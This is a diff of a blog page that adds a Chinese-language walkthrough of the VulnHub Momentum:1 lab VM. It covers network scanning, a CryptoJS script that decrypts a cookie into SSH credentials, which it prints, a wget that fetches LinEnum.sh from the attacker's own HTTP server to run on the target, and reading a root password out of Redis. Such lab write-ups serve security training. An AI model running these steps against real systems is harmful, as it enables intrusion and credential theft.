@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="/images/a.jpg">
-  <title>vulnhub DarkHole：1 | Facker007's blog</title>
+  <title>vulnhub Momentum:1 | Facker007's blog</title>
   <meta name="author" content="Facker007" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,17 +13,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="" />
+    <meta name="keywords" content="vulnhub" />
   
-  <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub DarkHole：1">
-<meta property="og:url" content="http://example.com/2021/08/21/vulnhub-DarkHole%EF%BC%9A1/index.html">
+  <meta name="description" content="找主机，主机全端口探测 12netdiscover -i eth0nmap -p- -sV -T5 ip  gobuster扫描查看到三个目录 其他目录没什么异常的，js文件夹下有个main.js看到了aes的代码被注释了查看js代码，获取cookie。查看cookie的头像是aes的解密。加上前面的密码 12345678http:&#x2F;&#x2F;nodejs.cn&#x2F;downlo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub Momentum:1">
+<meta property="og:url" content="http://example.com/2021/08/22/vulnhub-Momentum-1/index.html">
 <meta property="og:site_name" content="Facker007&#39;s blog">
+<meta property="og:description" content="找主机，主机全端口探测 12netdiscover -i eth0nmap -p- -sV -T5 ip  gobuster扫描查看到三个目录 其他目录没什么异常的，js文件夹下有个main.js看到了aes的代码被注释了查看js代码，获取cookie。查看cookie的头像是aes的解密。加上前面的密码 12345678http:&#x2F;&#x2F;nodejs.cn&#x2F;downlo">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/a.jpg">
-<meta property="article:published_time" content="2021-08-21T04:24:08.000Z">
-<meta property="article:modified_time" content="2021-08-21T04:24:08.596Z">
+<meta property="article:published_time" content="2021-08-22T04:19:00.000Z">
+<meta property="article:modified_time" content="2021-08-23T08:42:42.318Z">
 <meta property="article:author" content="Facker007">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/a.jpg">
 <meta name="twitter:site" content="@null">
@@ -111,17 +114,17 @@
     <article>
         <div class="kratos-hentry kratos-post-inner clearfix">
             <header class="kratos-entry-header">
-                <h1 class="kratos-entry-title text-center">vulnhub DarkHole：1</h1>
+                <h1 class="kratos-entry-title text-center">vulnhub Momentum:1</h1>
                 
                 <div class="kratos-post-meta text-center">
                     <span>
-                        <i class="fa fa-calendar"></i> 2021-08-21
+                        <i class="fa fa-calendar"></i> 2021-08-22
                         <i class="fa fa-folder"></i> 分类 
                         <i class="fa fa-user"></i> 作者 Facker007
                         <i class="fa fa-edit"></i> 
                         
                         
-                            0
+                            ~1.85K
                         
                         字
                         
@@ -130,11 +133,41 @@
             </header>
             <div class="kratos-post-content">
                 <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                    本文最后编辑于 <time datetime="1629519848596"></time> 前，其中的内容可能需要更新。
+                    本文最后编辑于 <time datetime="1629708162318"></time> 前，其中的内容可能需要更新。
                 </div>
                 
                 <hr />
-                
+                <p>找主机，主机全端口探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br><span class="line">nmap -p- -sV -T5 ip</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt="1.png"></p>
+<p>gobuster扫描查看到三个目录<br><img src="2.png" alt="2.png"></p>
+<p>其他目录没什么异常的，js文件夹下有个main.js看到了aes的代码被注释了<br>查看js代码，获取cookie。查看cookie的头像是aes的解密。加上前面的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;nodejs.cn&#x2F;download&#x2F;        &#x2F;&#x2F;安装nodejs</span><br><span class="line">npm install crypto-js          &#x2F;&#x2F;在安装crypto-js</span><br><span class="line">node a.js            &#x2F;&#x2F;运行代码</span><br><span class="line"></span><br><span class="line">	var message &#x3D; &#39;U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt&#39;;</span><br><span class="line">	var CryptoJS &#x3D; require(&quot;crypto-js&quot;);</span><br><span class="line">	var decrypted &#x3D; CryptoJS.AES.decrypt(message, &quot;SecretPassphraseMomentum&quot;);</span><br><span class="line">	console.log(decrypted.toString(CryptoJS.enc.Utf8));</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="3.png"><br>运行代码，得到一串字符<br><img src="4.png" alt="4.png"></p>
+<p>找<a target="_blank" rel="noopener" href="https://www.browserling.com/tools/aes-decrypt">在线网站</a>解密也可以，不过好多网站不行。<br><img src="3-2.png" alt="3-2.png"></p>
+<p>谷歌可以搜到的代码笔，同样的加密。js<br><img src="3-3.png" alt="3-3.png"></p>
+<p>上面三种方法都可以得到密码的。然后用户名就是密码的前缀。直接ssh登录就可以了。顺便cat了第一个flag（user.txt）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh auxerre@192.168.0.103</span><br><span class="line">password:auxerre-alienum##</span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="5.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum    &#x2F;&#x2F;下载一个自动收集信息的tool</span><br><span class="line"></span><br><span class="line">python3 -m http.server 8081           &#x2F;&#x2F;利用py来搭一个http服务器</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;192.168.0.105:8081&#x2F;LinEnum.sh       &#x2F;&#x2F;下载文件</span><br><span class="line"></span><br><span class="line">chmod +x LinEnum.sh              &#x2F;&#x2F;给执行权</span><br><span class="line"></span><br><span class="line">.&#x2F;LinEnum.sh &gt; 1.txt           &#x2F;&#x2F;运行结果写到1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="6.png"></p>
+<p>查一下suid，端口和kernel（内核）。看到端口有个6379，redis数据库默认端口就是6379<br><img src="7.png" alt="7.png"></p>
+<p>netstat用不了，用ss(socket statistics)来查看端口信息<br><img src="8.png" alt="8.png"></p>
+<p>直接通过 ‘keys *’<br>查看有的密钥，然后get password来查看</p>
+<p><img src="9.png" alt="9.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli           &#x2F;&#x2F;本地直接redis-cli登录</span><br><span class="line">keys *              &#x2F;&#x2F;获取密钥</span><br><span class="line">get rootpass          &#x2F;&#x2F;查看密钥的值</span><br></pre></td></tr></table></figure>
+<p><img src="9-2.png" alt="9-2.png"></p>
+<p>通过ssh -L 来转发在本地查看的一种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.0.103</span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
+<p><img src="10.png" alt="10.png"></p>
+<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/ssh.1.html">查看ssh帮助（man）网站</a><br><img src="11.png" alt="11.png"></p>
+<p>获得密码之后再登录<br>cat final flag（root.txt）<br><img src="get-final-flag.png" alt="get-final-flag.png"></p>
+<p>其他参考：<br><a target="_blank" rel="noopener" href="https://www.infosecarticles.com/momentum-1-vulnhub-walkthrough/">1.</a><br><a target="_blank" rel="noopener" href="https://www.infosecarticles.com/momentum-1-vulnhub-walkthrough/">https://www.infosecarticles.com/momentum-1-vulnhub-walkthrough/</a></p>
+<p><a target="_blank" rel="noopener" href="https://abhijithkumar2000.medium.com/vulnhub-walktrhough-momentum-1-f3d01d1422f7">2.</a><br><a target="_blank" rel="noopener" href="https://abhijithkumar2000.medium.com/vulnhub-walktrhough-momentum-1-f3d01d1422f7">https://abhijithkumar2000.medium.com/vulnhub-walktrhough-momentum-1-f3d01d1422f7</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/1059">3.</a><br><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/1059">https://www.sec-in.com/article/1059</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.vxer.cn/?id=76">4.</a><br><a target="_blank" rel="noopener" href="http://www.vxer.cn/?id=76">http://www.vxer.cn/?id=76</a></p>
+<p><a target="_blank" rel="noopener" href="https://nepcodex.com/2021/06/vulnhub-momentum-1-walkthrough-writeup/">5.</a><br><a target="_blank" rel="noopener" href="https://nepcodex.com/2021/06/vulnhub-momentum-1-walkthrough-writeup/">https://nepcodex.com/2021/06/vulnhub-momentum-1-walkthrough-writeup/</a></p>
+
             </div>
             
                 <div class="kratos-copyright text-center clearfix">
@@ -187,7 +220,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2021/08/21/vulnhub-DarkHole%EF%BC%9A1/",
+                text: "http://example.com/2021/08/22/vulnhub-Momentum-1/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -199,9 +232,13 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2021/08/21/vulnhub-DarkHole%EF%BC%9A1/";
-            const title         = "「vulnhub DarkHole：1」";
-            const excerpt       = ``;
+            const hostUrl       = "http://example.com/2021/08/22/vulnhub-Momentum-1/";
+            const title         = "「vulnhub Momentum:1」";
+            const excerpt       = `找主机，主机全端口探测
+12netdiscover -i eth0nmap -p- -sV -T5 ip
+
+gobuster扫描查看到三个目录
+其他目录没什么异常的，js文件夹下有个main.js看到了aes的代码被注释了查看js代码...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -220,10 +257,10 @@
                 <div class="footer-tag clearfix">
                     <div class="pull-left">
                     <i class="fa fa-tags"></i>
-                        
+                        <a class="tag-none-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2021-08-21</span>
+                    <span>最后编辑：2021-08-23</span>
                     </div>
                 </div>
             </footer>
@@ -283,7 +320,7 @@
         
           
           
-            <a class="list-group-item" href="/2021/08/21/vulnhub-DarkHole%EF%BC%9A1/"><i class="fa  fa-book"></i> vulnhub DarkHole：1</a>
+            <a class="list-group-item" href="/2021/08/22/vulnhub-Momentum-1/"><i class="fa  fa-book"></i> vulnhub Momentum:1</a>
             
           
         
